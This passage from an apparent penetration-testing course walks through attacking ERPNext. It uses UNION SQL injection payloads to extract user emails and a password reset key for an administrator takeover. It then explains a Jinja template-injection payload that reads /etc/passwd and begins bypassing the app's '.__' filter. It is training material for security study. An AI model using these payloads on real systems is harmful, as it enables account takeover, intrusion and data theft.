  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```

> Listing 44 - SQL injection query with collation

Sending this payload in Burp allows us to extract the name/email from the database.

![Figure 39: Extracting the name/email from Database](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/ab07fe48a41a1f65265b96b5cf25628a-erpnext_sqli_extracting_name.png)

Figure 39: Extracting the name/email from Database

This returns the response shown in Listing 45.

```
{"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
```

> Listing 45 - Extracting the users

Based on the response, the email we used to create the admin user was discovered. This is the account that we will target for the password reset. We can enter the email in the _Forgot Password_ field.

![Figure 40: Email in Password Reset Field](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/a4b38684813d5c0d68c7263e4567455f-erpnext_email_password_reset.png)

Figure 40: Email in Password Reset Field

Selecting _Send Password_ will create the password reset token for the user and send an email about the password reset.

![Figure 41: Password Reset Complete](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/841586a2f0c112b270cd7689654919e2-erpnext_sqli_password_reset_complete.png)

Figure 41: Password Reset Complete

Next, we can use the SQL injection to extract the reset key. We know that the reset key is contained in the tabUser table, but we don't know which column yet. To find the column, we will use the query in Listing 46.

```
SELECT COLUMN_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "tabUser";
```

> Listing 46 - Query to discover password reset column

Again, we need to make this conform to the UNION query.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```

> Listing 47 - Finding table name for password reset

The highlighted part displayed above is the payload that we'll send in Burp via the _scope_ variable.

![Figure 42: SQLi to Obtain List of Column Names](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/b2c0ad14126c181520760d394e1399bc-erpnext_sqli_get_column_names.png)

Figure 42: SQLi to Obtain List of Column Names

Sending that SQL injection payload returns the JSON found in Listing 48.

```
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"name"},...,{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"birth_date"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"reset_password_key"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"email"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"_comments"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"allowed_in_mentions"}]}
```

> Listing 48 - List of column names

From the list of columns, we notice _reset_password_key_. We can use this column name to extract the password reset key. We should also include the _name_ column to ensure that we are obtaining the reset key for the correct user. The query for this is:

```
SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
FROM tabUser;
```

> Listing 49 - Extracting the reset key query

The SQL query in Listing 49 needs to conform to the UNION query. This time, we will use the number "1" for the name/email and number "5" for the _reset_password_key_. The updated query can be found in Listing 50.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```

> Listing 50 - Payload for password reset key

Using the highlighted section in Listing 50 as the payload in Burp, we can obtain the password reset key.

![Figure 43: Obtaining the Password Reset key](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/8ceec4b3ef95e4495f851beee96f753e-erpnext_obtaining_password_reset_key.png)

Figure 43: Obtaining the Password Reset key

The Burp response contains the password_reset_key in the "route" string with the email in the "doctype" string. An example is shown in Listing 51.

```
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Administrator","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Guest","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"zeljka.k@randomdomain.com","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}]}
```

> Listing 51 - Password reset key in response

Now that we have the password_reset_key, let's figure out how to use it to reset the password. We will search the application's source code for "reset_password_key" with the idea that wherever this column is used, it will most likely give us a hint on how to use the key.

![Figure 44: Finding reset_password Function](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/b183b3bc574685092296b052eeaf56ef-erpnext_finding_reset_password_func.png)

Figure 44: Finding reset_password Function

Searching for "reset_password_key" allows us to discover the _reset_password_ function in the file apps/frappe/frappe/core/doctype/user/user.py. The function can be found below.

```
	def reset_password(self, send_email=False, password_expired=False):
		from frappe.utils import random_string, get_url

		key = random_string(32)
		self.db_set("reset_password_key", key)

		url = "/update-password?key=" + key
		if password_expired:
			url = "/update-password?key=" + key + '&password_expired=true'

		link = get_url(url)
		if send_email:
			self.password_reset_mail(link)

		return link
```

> Listing 52 - reset_password function

The _reset_password_ function is used to generate the reset_password_key. Once the random key is generated, a link is created and emailed to the user. We can use the format of this link to attempt a password reset. The link we will visit in our example is:

```
http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0
```

> Listing 53 - Password reset link

Visiting this link in our browser provides us with a promising result.

![Figure 45: Visiting the Password Reset Link](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/07349bf6a66392729c9b80fd99071a5f-erpnext_visting_password_reset.png)

Figure 45: Visiting the Password Reset Link

If we type in a new password, we should receive a "Password Updated" message!

![Figure 46: Password Updated](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/cfa0a9f7063c06662e1264b3ea5242a1-erpnext_pass_updated.png)

Figure 46: Password Updated

We should now be able to log in as the administrator user (zeljka.k@randomdomain.com) using our new password.

#### Exercises

1. Recreate the steps above to gain access to the administrator account.
2. Attempt to use the LIMIT field for SQL injection. What issue do you run into?
3. How could we use the SQL injection to make the password reset go unnoticed once we have system access?

1

(database.guide, 2018), [https://database.guide/what-is-collation-in-databases/](https://database.guide/what-is-collation-in-databases/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_267-1)

## 5.5. SSTI Vulnerability Discovery

Now that we have admin access to the application using the SQL injection, let's attempt to obtain remote code execution. Frappe uses the Jinja[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_268-1) templating engine extensively. ERPNext even advertises email templates that use Jinja directly.[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_268-2)

This fact points to Server Side Template Injection (SSTI) as a great potential research target. Before we get into the details of finding the vulnerability, we need to understand how templating engines work and how they can be exploited.

1

(Pallets Projects, 2020), [https://jinja.palletsprojects.com/en/2.11.x/](https://jinja.palletsprojects.com/en/2.11.x/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_268-1)

2

(ERPNext, 2020), [https://erpnext.com/docs/user/manual/en/setting-up/email/email-template](https://erpnext.com/docs/user/manual/en/setting-up/email/email-template) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_268-2)

### 5.5.1. Introduction to Templating Engines

We can use templating engines to render a static file dynamically based on the context of the request and user. An example of this is a header that shows the username when the user is logged in. When no user is logged in, the header might say "Hello, Guest"; however, as soon as a user logs in, the header will change to "Hello, Username". This allows developers to centralize the location of reusable content and to further separate the view from the Model-View-Controller paradigm.

A templating engine leverages delimiters so developers can tell the engine where a template block starts and ends. The most common delimiters are expressions and statements. In Python (and Jinja), an expression is a combination of variables and operations that results in a value (_7*7_), while a statement will represent an action (_print("hello")_).

A common delimiter to start an expression is "{{", with "}}" used to end expressions. A common delimiter to start a statement is "{%", with "%}" used to end a statement.

A templating engine commonly uses its own syntax separate from the languages it was built in, but with many ties back into it. As an example, to get the length of a string in Python, we might use the _len_ function and pass in the string as shown in Listing 54.

```
kali@kali:~$ python3
...
>>> len("hello!")
6
```

> Listing 54 - Using len to find string length

In Jinja, we would use the "|" character to pipe a variable into the _length_ filter.[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-1) However, this filter will run the Python _len_ function.[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-2) This means that, while Jinja might use a separate syntax for writing expressions and statements, the underlying "kernel" is still Python.

If an application gives us the ability to inject into templates, we might be able to escape the "sandbox" of the templating engine and run system-level code. Some templating engines contain direct classes to execute system-level calls[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-3) while others make it more difficult, requiring creative exploits.

Cross-site scripting vulnerabilities might also hint at an SSTI vulnerability since user-provided code is being entered into an unsanitized field. To discover SSTI, we commonly use a payload like "{{ 7*7 }}". If the response is "49", we know that the payload was processed. While there's no universal payload to exploit any SSTI to lead to RCE, there _is_ a common payload used to exploit Jinja (Listing 55).

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

> Listing 55 - Common SSTI payload

Let's dissect the payload to learn more. First, an empty string is created with the two single-quote characters. Next, the ___class___ attribute returns the class to which the string belongs. In this case, it's the _str_ class[4](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-4) as demonstrated in Listing 56.

```
kali@kali:~$ python3
...
>>> ''.__class__
<class 'str'>
```

> Listing 56 - Obtaining the class of the empty string

Once the class is returned, the payload uses the ___mro___ attribute. MRO stands for "Method Resolution Order", which Python describes as:

"...a tuple of classes that are considered when looking for base classes during method resolution."[5](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-5)

This definition raises more questions than it answers. To better understand the ___mro___ attribute, we need to discuss Python inheritance. In Python, a class can inherit from other classes.

To demonstrate, consider a grocery inventory system. The parent class of _Food_ might have attributes that all food items share like _Calories_. A class of _Fruit_ would inherit from _Food_, but could also build on it with levels of _Fructose_, which are not as important to track on other food items like meat. This chain could continue with a fruit like _Watermelon_ inheriting the _Fructose_ attribute from _Fruit_ and the _Calories_ attribute from _Food_ and building on it with a _Weight_ attribute.

![Figure 47: Inheritance with Food](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/3311f110f2fb48e480ee27e166f8f6bd-erpnext_inheritance_food.png)

Figure 47: Inheritance with Food

Listing 57 shows an example of creating classes with inheritance in Python.

```
>>> class Food:
...     calories = 100
... 
>>> class Fruit(Food):
...     fructose = 2.0
... 
>>> class Strawberry(Fruit):
...     ripeness = "Ripe"
... 
>>> s = Strawberry()
>>> s.calories
100
>>> s.fructose
2.0
>>> s.ripeness
'Ripe'
```

> Listing 57 - Example Inheritance with Strawberry

If we were to access the ___mro___ attribute of the _Strawberry_ class, we would discover the resolution order for the class.

```
>>> Strawberry.__mro__
(<class '__main__.Strawberry'>, <class '__main__.Fruit'>, <class '__main__.Food'>, <class 'object'>)
```

> Listing 58 - __mro__ of Strawberry

The ___mro___ attribute returned a tuple of classes in the order that an attribute would be searched for. If, for example, we were to access the _Calories_ attribute, first the _Strawberry_ class would be searched, next the _Fruit_ class, then the _Food_ class, and finally the _object_ class.

Note that the _object_ class was not specifically inherited. As of Python 3, whenever a class is created, the built-in _object_ class is inherited.[6](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-6) This is important because it changes the variable we might use when exploiting an SSTI. Let's go back to our payload and determine the goal of ___mro___ in this scenario.

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

> Listing 59 - Accessing __mro__ attribute in payload

We'll attempt to get the second index of the tuple returned by the ___mro___ attribute in the payload.

```
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)

>>> ''.__class__.__mro__[2]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
IndexError: tuple index out of range
```

> Listing 60 - Index out of range from payload

Accessing the second index of the ___mro___ attribute returns the error: "tuple index out of range". However, if we were to run this in Python 2.7, we would receive a different result.

```
kali@kali:~$ python2.7
...
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)

>>> ''.__class__.__mro__[2]
<type 'object'>
```

> Listing 61 - Using Python2.7 to view __mro__ attribute of empty string

In Python 2.7, the second index of the tuple returned by the ___mro___ attribute is the _object_ class. In Python 2.7, the _str_ class inherits from the _basestring_ class while in Python 3, _str_ inherits directly from the _object_ class. This means we will have to be cognizant of the index that we use so that we can get access to the _object_ class.

Now that we understand the ___mro___ attribute, let's continue with our payload.

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

> Listing 62 - Original payload

Since Python 2.7 is retired, we must retrofit this payload to work with Python 3.0. To accommodate this, we will now begin using "1" as the index in the tuple unless we are referring to the original Python 2.7 payload.

Next, the payload runs the ___subclasses___ method within the _object_ class that was returned by the ___mro___ attribute. Python defines this attribute as follows:

Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive.[7](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-7)

The ___subclasses___ will return all references to the class from which we are calling it. Considering that we will call this from the built-in _object_ class, we should expect to receive a large list of classes.

```
kali@kali:~$ python3
...
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, ... <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'rlcompleter.Completer'>]
```

> Listing 63 - Subclasses of object class

As expected, we will get a complete list of currently-loaded classes that inherit from the _object_ class. The original payload references the 40th index of the list that is returned. In our list, this returns the _wrapper_descriptor_ class.

```
>>> ''.__class__.__mro__[1].__subclasses__()[40]
<class 'wrapper_descriptor'>
```

> Listing 64 - 40th index of object class in python3

Since the payload is trying to read the /etc/passwd file and the _wrapper_descriptor_ class does not have a _read_ function, we know something is not right.

```
>>> dir(''.__class__.__mro__[1].__subclasses__()[40])
['__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'copy', 'get', 'items', 'keys', 'values']
```

> Listing 65 - List of attributes and methods of mappingproxy

However, if we use this payload in Python 2.7, the returned item in the 40th index is the _file_ type.

The returned _file_ is a type and not a class - this won't affect how we handle the returned item. Since Python 2.2, a unification of types to classes has been underway.[8](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_269-8) In Python 3, types and classes are the same.

```
kali@kali:~$ python2.7
...
>>> ''.__class__.__mro__[2].__subclasses__()[40]
<type 'file'>

>>> dir(''.__class__.__mro__[2].__subclasses__()[40])
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

> Listing 66 - 40th index of object class in python3

Essentially, the payload is using the _file_ type, passing in the file to be read (/etc/passwd), and running the _read_ method. In Python 2.7, we can read the /etc/passwd file.

```
>>> ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
'root:x:0:0:root:/root:/usr/bin/fish\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n...\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\n'
```

> Listing 67 - Reading /etc/passwd

We need to find the index of a function in Python 3 that will allow us to accomplish RCE. We'll save the search for that function while we develop a more holistic picture of what's being loaded by Frappe and ERPNext.

1

(Pallets, 2007), [https://jinja.palletsprojects.com/en/2.10.x/templates/#length](https://jinja.palletsprojects.com/en/2.10.x/templates/#length) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-1)

2

(Github, 2019), [https://github.com/pallets/jinja/blob/d8820b95d60ecc6a7b3c9e0fc178573e62e2f012/jinja2/filters.py#L1329](https://github.com/pallets/jinja/blob/d8820b95d60ecc6a7b3c9e0fc178573e62e2f012/jinja2/filters.py#L1329) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-2)

3

(Apache, 2020), [https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html](https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-3)

4

(Python, 2020), [https://docs.python.org/3/library/stdtypes.html?highlight=__class__#instance.__class__](https://docs.python.org/3/library/stdtypes.html?highlight=__class__#instance.__class__) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-4)

5

(Python, 2020), [https://docs.python.org/3/library/stdtypes.html?#class.__mro__](https://docs.python.org/3/library/stdtypes.html?#class.__mro__) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-5)

6

(Python, 2019), [https://wiki.python.org/moin/NewClassVsClassicClass](https://wiki.python.org/moin/NewClassVsClassicClass) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-6)

7

(Python, 2020), [https://docs.python.org/3/library/stdtypes.html?#class.__subclasses__](https://docs.python.org/3/library/stdtypes.html?#class.__subclasses__) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-7)

8

(Python, 2001), [https://www.python.org/dev/peps/pep-0252/](https://www.python.org/dev/peps/pep-0252/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_269-8)

### 5.5.2. Discovering The Rendering Function

We know that ERPNext email templates use the Jinja templating engine, so let's determine if we can find that feature in the application. We will do this by searching for "template" using the search function at the top of the application while logged in as the administrator.

We will run all of this through Burp to ensure we capture the traffic if we need to replay something later.

![Figure 48: Discovering Email Template List](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/07dce06bef9c9845f9344c586695ce12-erpnext_discovering_email_template_list.png)

Figure 48: Discovering Email Template List

This search leads us to discover the link for "Email Template List", a page that allows users of ERPNext to view and create email templates used throughout the application.

![Figure 49: Viewing Email Template List](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/f96f5ddaa6fef47bdd351ea362d2b558-erpnext_viewing_email_template_list.png)

Figure 49: Viewing Email Template List

Navigating to the top right and clicking _New_ opens a page to create a new email template.

On the "New Email Template" page, we are required to provide the "Name" and "Subject". Let's enter "Hacking with SSTI" for both entries. In the "Response" textbox, we will provide the basic SSTI testing payload.

![Figure 50: Creating Basic {{7*7}} Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/93b580ac632af7c629f420aa0807f985-erpnext_creating_basic_SSTI.png)

Figure 50: Creating Basic {{7*7}} Template

With our basic email template created, the next step is to generate the email and view the output. Luckily, ERPNext allows us to email from many pages using our created email template. From the email template page, let's select _Menu_ > _Email_ to open a new email page.

![Figure 51: Navigating to Sending Email Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/f812d4044056dd07809fb2934d1de9a8-erpnext_navigating_sending_email.png)

Figure 51: Navigating to Sending Email Template

From here, we can provide a fake email address (we won't be sending this email) and select the email template that we just created.

![Figure 52: Selecting Email Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/c560335442674e9684c99ac31fd2eba4-erpnext_selecting_email_template.png)

Figure 52: Selecting Email Template

With the email template selected, we will find the number "49" in the message field. This means that the SSTI works! But this is a feature of ERPNext, so it doesn't mean we have code execution.

![Figure 53: Viewing Output Of Email Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/5e776aa7cf20fdcda897edb3a66fae35-erpnext_viewing_49_email_template.png)

Figure 53: Viewing Output Of Email Template

Having confirmed that we can use a basic Jinja template in an email template, we can attempt to build our SSTI payload. First, let's capture the request used to run the template so we don't have to create a new email each time we need to test the payload.

We'll open the Burp _Proxy_ tab and navigate to the _HTTP History_ tab to inspect our request to render the email template. Let's find the request that was sent when we selected the email template and the server responded with "49".

![Figure 54: Burp History Discovering get_email_template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/9affb655756386cf1361374855fa217c-erpnext_discovering_get_email_template.png)

Figure 54: Burp History Discovering get_email_template

Searching for a request that references the "Hacking with SSTI" subject, we will discover the request in Figure 54 that sends a POST request to the _get_email_template_ function. We can send this request to Repeater to replay it.

![Figure 55: Sending Request to Repeater](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/a89d714a5c989795faf5101c9ad3a797-erpnext_sending_req_to_repeater.png)

Figure 55: Sending Request to Repeater

Now that we can easily inspect the output, let's start building our payload. We will replace the "{{7*7}}" in the template with "{{ ''.__class__ }}" to determine if we can replicate accessing the class of an empty string as we did in the Python console.

![Figure 56: Changing Email Template to include \_\_class\_\_](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/26e00e7e927c6f051cebbecc21e5deb1-erpnext_email_temp_class.png)

Figure 56: Changing Email Template to include \_\_class\_\_

Unfortunately, when we send this request, we hit a wall. The server responds with an "Illegal template" error.

![Figure 57: Using Illegal template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/8e0664387d0ef2d2a2e5ed1af3c4e2df-erpnext_error_illegal_template.png)

Figure 57: Using Illegal template

To determine the cause of this issue, let's set a breakpoint on the _get_email_template_ function and follow the code execution. We can search for the string "get_email_template", and discover a function in apps/frappe/frappe/email/doctype/email_template/email_template.py.

```
14  @frappe.whitelist()
15  def get_email_template(template_name, doc):
16          '''Returns the processed HTML of a email template with the given doc'''
17          if isinstance(doc, string_types):
18                  doc = json.loads(doc)
19
20          email_template = frappe.get_doc("Email Template", template_name)
21          return {"subject" : frappe.render_template(email_template.subject, doc),
22                          "message" : frappe.render_template(email_template.response, doc)}
```

> Listing 68 - Reviewing get_email_template function

Line 14, before the function is defined, tells Frappe that this method is whitelisted and can be executed via an HTTP request. Line 15 defines the function and the two arguments. Line 16 describes that the function "Returns the processed HTML of a email template", which means that we are on the right track. If the _doc_ argument passed to _isinstance_ on Line 17 is a string, the string is deserialized as JSON into a Python object. Line 20 loads the email_template and finally, lines 21-22 render the subject and body of the template.

Suspecting that _render_template_ is throwing the error, we can pause execution by setting a breakpoint on line 22.

![Figure 58: Setting Breakpoint on Line 22](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/511916c47f3808b9911ecca5a7311e5e-erpnext_setting_breakpint_22.png)

Figure 58: Setting Breakpoint on Line 22

Let's run the Burp request again to trigger the breakpoint. Once triggered, we will select the _Step Into_ button to enter the _render_ function for further review. This takes us to the _render_template_ function found in apps/frappe/frappe/utils/jinja.py.

```
53  def render_template(template, context, is_path=None, safe_render=True):
54          '''Render a template using Jinja
55
56          :param template: path or HTML containing the jinja template
57          :param context: dict of properties to pass to the template
58          :param is_path: (optional) assert that the `template` parameter is a path
59          :param safe_render: (optional) prevent server side scripting via jinja templating
60          '''
61
62          from frappe import get_traceback, throw
63          from jinja2 import TemplateError
64
65          if not template:
66                  return ""
67
68          # if it ends with .html then its a freaking path, not html
69          if (is_path
70                  or template.startswith("templates/")
71                  or (template.endswith('.html') and '\n' not in template)):
72                  return get_jenv().get_template(template).render(context)
73          else:
74                  if safe_render and ".__" in template:
75                          throw("Illegal template")
76                  try:
77                          return get_jenv().from_string(template).render(context)
78                  except TemplateError:
79                          throw(title="Jinja Template Error", msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, tb=get_traceback()))
```

> Listing 69 - Reviewing render_template function

The _render_template_ function seems to do what we would expect. Examining the _if_ statement on lines 74-75, it seems that the developers have thought about the SSTI issue and attempted to curb any issues by filtering the ".__" characters.

Our next goal is to hit line 77 where _get_jenv_ is used to render the template that is provided by user input. This makes executing the SSTI more difficult since the payload requires ".__" to navigate to the _object_ class.

#### Exercise

Recreate the steps in the section above to discover how the _render_template_ function is executed.

#### Extra Mile

Discover another location where ERPNext uses the render function to execute user-provided code.

### 5.5.3. SSTI Vulnerability Filter Evasion

In order to bypass the filter, we need to become more familiar with Jinja and determine our capabilities from the template perspective. Jinja's "Template Designer"[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_271-1) documentation is a good place to start.

Jinja offers one interesting feature called _filters_.[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_271-2) An example of a filter is the _attr()_ function,[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_271-3) which is designed to "get an attribute of an object". Listing 70 shows a trivial use case.

```
{% set foo = "foo" %}
{% set bar = "bar" %}
{% set foo.bar = "Just another variable" %}
{{ foo|attr(bar) }}
```

> Listing 70 - Example of attr filter

The output of this example would be: "Just another variable".

As mentioned earlier, while Jinja is built on Python and shares much of its functionality, the syntax is different. So while the filter is expecting the attribute to be accessed with a period followed by two underscores, we could rewrite the payload to use Jinja's syntax, making the "." unnecessary.

First, let's build the template to give us access to the attributes we will need to exploit the SSTI. We know that we will need a string, the ___class___ attribute, the ___mro___ attribute, and the ___subclasses___ attribute.

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
```

> Listing 71 - Configuring String and Attributes

The _string_ variable will replace the two single quotes ('') in the original payload. The rest of the values are the various attributes from the SSTI payload.

Now we can start building the SSTI payload string in the email template builder under the defined variables. First, let's attempt to get the ___class___ attribute of the _string_ variable using the expression "string|attr(class)".

![Figure 59: \_\_class\_\_ of string](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/d44ac6ed03f0b723663c07cb9ab0eeec-erpnext_class_of_string.png)

Figure 59: \_\_class\_\_ of string

With the template configured, let's render it and extract the classes of the string. If the SSTI works, we will receive a "<class 'str'>" response.

